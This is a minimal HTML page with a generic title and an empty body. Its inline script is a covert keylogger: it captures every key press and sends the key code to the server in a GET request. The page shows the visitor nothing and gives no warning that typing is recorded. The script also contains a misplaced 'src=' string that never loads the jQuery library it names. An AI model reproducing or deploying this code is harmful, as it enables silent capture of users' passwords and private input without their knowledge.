<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Title</title>
  <script>
    src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"
    document.addEventListener("keydown", event => {
      var xhttp = new XMLHttpRequest();
      xhttp.open("GET", "/index.html?sentkey=" + event.keyCode, true);
      xhttp.send();
    });
  </script>
</head>
<body>
</body>
</html>
